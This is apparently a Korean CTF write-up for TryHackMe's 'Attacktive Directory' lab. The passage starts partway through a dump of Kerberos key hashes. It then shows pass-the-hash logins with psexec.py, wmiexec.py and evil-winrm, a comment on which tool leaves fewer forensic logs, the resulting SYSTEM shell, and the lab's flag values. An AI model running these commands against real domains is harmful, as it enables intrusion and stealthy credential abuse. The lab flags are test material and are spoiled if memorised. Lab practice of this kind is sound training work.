spookysec.local\Muirland:des-cbc-md5:cb8a4a3431648c86
spookysec.local\horshark:aes256-cts-hmac-sha1-96:891e3ae9c420659cafb5a6237120b50f26481b6838b3efa6a171ae84dd11c166
spookysec.local\horshark:aes128-cts-hmac-sha1-96:c6f6248b932ffd75103677a15873837c
spookysec.local\horshark:des-cbc-md5:a823497a7f4c0157
spookysec.local\svc-admin:aes256-cts-hmac-sha1-96:effa9b7dd43e1e58db9ac68a4397822b5e68f8d29647911df20b626d82863518
spookysec.local\svc-admin:aes128-cts-hmac-sha1-96:aed45e45fda7e02e0b9b0ae87030b3ff
spookysec.local\svc-admin:des-cbc-md5:2c4543ef4646ea0d
spookysec.local\backup:aes256-cts-hmac-sha1-96:23566872a9951102d116224ea4ac8943483bf0efd74d61fda15d104829412922
spookysec.local\backup:aes128-cts-hmac-sha1-96:843ddb2aec9b7c1c5c0bf971c836d197
spookysec.local\backup:des-cbc-md5:d601e9469b2f6d89
spookysec.local\a-spooks:aes256-cts-hmac-sha1-96:cfd00f7ebd5ec38a5921a408834886f40a1f40cda656f38c93477fb4f6bd1242
spookysec.local\a-spooks:aes128-cts-hmac-sha1-96:31d65c2f73fb142ddc60e0f3843e2f68
spookysec.local\a-spooks:des-cbc-md5:e09e4683ef4a4ce9
ATTACKTIVEDIREC$:aes256-cts-hmac-sha1-96:128de5bc2157dbde6d8acae12619b4ca6a8dec5f4b0d309ac0d7cfd1d7d0783c
ATTACKTIVEDIREC$:aes128-cts-hmac-sha1-96:eaf67abcb1a5b9007b5f04cac2365555
ATTACKTIVEDIREC$:des-cbc-md5:9426b6febf6dc2ab
[*] Cleaning up...
```

# 얻은 해시 정보로 바로 로그인

## 1. psexec.py (impacket)

- SMB/NTLM 해시로 윈도우 명령 프롬프트 쉘 획득
- 관리자 해시 필요

```bash
# administrator 계정으로 바로 로그인 시도
python3 /impacket/examples/psexec.py spookysec.local/administrator -hashes aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc -dc-ip 10.10.107.58

# evil-winrm 사용해서 하는 방법
evil-winrm -i 10.10.107.58 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
```

```
[Errno Connection error (spookysec.local/administrator:445)] [Errno -2] Name or service not known
```

## 원인

- spookysec.local 도메인 이름을 IP로 변환 못함 (DNS 문제)
- /etc/hosts에 도메인-IP 매핑이 없거나 오타

```bash
# psexec.py -> 풀 기능 쉘 연결 -> 로그 많이 남음 -> 포렌식에 잘 걸림
python3 /impacket/examples/psexec.py administrator@10.10.107.58 -hashes aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc

# wmiexec.py -> 간이 쉘 연결 -> 로그 거의 없음 -> 연결 불안정
python3 /impacket/examples/wmiexec.py administrator@10.10.107.58 -hashes aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc

```

┌──(test)(root㉿docker-desktop)-[/impacket]
└─# python3 /impacket/examples/psexec.py administrator@10.10.107.58 -hashes aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc
/impacket/test/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
import pkg_resources
Impacket v0.13.0.dev0+20250707.152659.a60a1f17 - Copyright Fortra, LLC and its affiliated companies

[*] Requesting shares on 10.10.107.58.....
[*] Found writable share ADMIN$
[*] Uploading file alNSfNJr.exe
[*] Opening SVCManager on 10.10.107.58.....
[*] Creating service qVuD on 10.10.107.58.....
[*] Starting service qVuD.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1490]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
C:\>

# 시스템 침투 성공

C:\>dir
Volume in drive C has no label.
Volume Serial Number is EEA6-70E8

Directory of C:\

04/04/2020 11:32 AM <DIR> inetpub
09/17/2020 04:43 PM <DIR> PerfLogs
04/04/2020 11:26 AM <DIR> Program Files
09/15/2018 02:06 AM <DIR> Program Files (x86)
04/04/2020 12:07 PM <DIR> Shares
09/17/2020 04:03 PM <DIR> Users
07/12/2025 05:56 PM <DIR> Windows
0 File(s) 0 bytes
7 Dir(s) 14,695,264,256 bytes free

# 플래그 찾기

```
C:\>dir /s /b root.txt
dir /s /b *root*
```

C:\Documents and Settings\Administrator\Desktop\root.txt
C:\Users\Administrator\Desktop\root.txt

type C:\Users\Administrator\Desktop\root.txt

# 다른 유저들 플래그 찾기

\Users

09/17/2020 04:03 PM <DIR> .
09/17/2020 04:03 PM <DIR> ..
09/17/2020 04:04 PM <DIR> a-spooks
09/17/2020 04:02 PM <DIR> Administrator
04/04/2020 12:19 PM <DIR> backup
04/04/2020 01:07 PM <DIR> backup.THM-AD
04/04/2020 11:19 AM <DIR> Public
04/04/2020 12:18 PM <DIR> svc-admin
0 File(s) 0 bytes
8 Dir(s) 14,642,311,168 bytes free

C:\Users>

strator\Desktop\root.txt

C:\>cd Users
C:\Users>cd Administrator
C:\Users\Administrator>cd Desktop
C:\Users\Administrator\Desktop>type root.txt
TryHackMe{4ctiveD1rectoryM4st3r}
C:\Users\Administrator\Desktop>cd ...
C:\Users>dir
Volume in drive C has no label.
Volume Serial Number is EEA6-70E8

Directory of C:\Users

09/17/2020 04:03 PM <DIR> .
09/17/2020 04:03 PM <DIR> ..
09/17/2020 04:04 PM <DIR> a-spooks
09/17/2020 04:02 PM <DIR> Administrator
04/04/2020 12:19 PM <DIR> backup
04/04/2020 01:07 PM <DIR> backup.THM-AD
04/04/2020 11:19 AM <DIR> Public
04/04/2020 12:18 PM <DIR> svc-admin
0 File(s) 0 bytes
8 Dir(s) 14,642,311,168 bytes free

C:\Users>cd svc-admin/Desktop
C:\Users\svc-admin\Desktop>dir
Volume in drive C has no label.
Volume Serial Number is EEA6-70E8

Directory of C:\Users\svc-admin\Desktop

04/04/2020 12:18 PM <DIR> .
04/04/2020 12:18 PM <DIR> ..
04/04/2020 12:18 PM 28 user.txt.txt
1 File(s) 28 bytes
2 Dir(s) 14,639,505,408 bytes free

C:\Users\svc-admin\Desktop>type user.txt.txt
TryHackMe{K3rb3r0s_Pr3_4uth}
C:\Users\svc-admin\Desktop>cd C:\Users\backup\Desktop
C:\Users\backup\Desktop>dir
Volume in drive C has no label.
Volume Serial Number is EEA6-70E8

Directory of C:\Users\backup\Desktop

04/04/2020 12:19 PM <DIR> .
04/04/2020 12:19 PM <DIR> ..
04/04/2020 12:19 PM 26 PrivEsc.txt
1 File(s) 26 bytes
2 Dir(s) 14,623,150,080 bytes free

C:\Users\backup\Desktop>type PrivEsc.txt
TryHackMe{B4ckM3UpSc0tty!}
C:\Users\backup\Desktop>
